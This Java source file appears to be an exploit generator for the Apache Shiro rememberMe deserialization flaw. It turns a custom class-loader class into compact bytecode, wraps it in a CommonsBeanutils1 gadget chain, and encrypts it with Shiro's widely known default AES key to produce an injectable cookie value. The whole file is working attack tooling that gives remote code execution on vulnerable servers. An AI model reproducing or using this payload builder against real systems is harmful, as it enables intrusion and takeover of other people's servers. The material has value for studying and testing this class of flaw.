package org.example;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import org.objectweb.asm.*;

public class Client1 {
    public static void main(String []args) throws Exception {

        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.get(MyClassLoader.class.getName());
        CtMethod ctMethod = clazz.getDeclaredMethod("transform");
        clazz.removeMethod(ctMethod);
        byte[] old_payload = shortenClassBytes(clazz.toBytecode());
        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(old_payload);
        //byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println(ciphertext.toString());
    }

    public static byte[] shortenClassBytes(byte[] classBytes) {
        ClassReader cr = new ClassReader(classBytes);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        int api = Opcodes.ASM7;
        ClassVisitor cv = new ShortClassVisitor(api, cw);
        int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
        cr.accept(cv, parsingOptions);
        byte[] out = cw.toByteArray();
        return out;
    }
    public static class ShortClassVisitor extends ClassVisitor {
        private final int api;
        public ShortClassVisitor(int api, ClassVisitor classVisitor) {
            super(api, classVisitor);
            this.api = api;
        }
        @Override
        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[ ] exceptions) {
            MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
            return new ShortMethodAdapter(this.api, mv);
        }
    }
    public static class ShortMethodAdapter extends MethodVisitor implements Opcodes {
        public ShortMethodAdapter(int api, MethodVisitor methodVisitor) {
            super(api, methodVisitor);
        }
        @Override
        public void visitLineNumber(int line, Label start) {
            // delete line number
        }
    }

}
